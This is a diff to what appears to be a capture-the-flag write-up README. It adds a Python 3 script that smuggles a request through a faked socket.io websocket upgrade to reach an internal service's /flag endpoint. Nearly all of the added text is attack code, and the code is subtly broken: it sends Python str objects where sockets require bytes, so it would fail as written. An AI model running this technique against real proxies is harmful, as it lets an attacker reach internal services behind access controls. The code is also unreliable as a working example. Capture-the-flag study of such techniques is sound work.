@@ -48,7 +48,47 @@
 
 <p align="center">
 <img width="600" src="../static/haha.gif">
-Python 2 ... is not dead yet :)
+Python 2 ... is not dead yet - anyway was just kidding. The Python 3 variant is below:
 </p>
+
+```python
+#!/usr/bin/env python3
+import socket
+
+req1 = """GET /socket.io/?EIO=3&transport=websocket HTTP/1.1
+Host: localhost:9020
+Sec-WebSocket-Version: 13
+Upgrade: websocket
+Connection: Upgrade
+
+""".replace('\n', '\r\n')
+
+
+req2 = """GET /flag HTTP/1.1
+Host: flask.net:5000
+
+""".replace('\n', '\r\n')
+
+def main(uri):
+    host, port = uri.split(':')
+
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+        sock.connect((host, int(port)))
+
+        sock.sendall(req1)
+        data = sock.recv(4096)
+        print(data)
+
+        sock.sendall(req2)
+        data = sock.recv(4096)
+        data = data.decode(errors = 'ignore')
+
+        print(data)
+
+        sock.shutdown(socket.SHUT_RDWR)
+
+if __name__ == "__main__":
+    main('localhost:9020')
+```
 
 
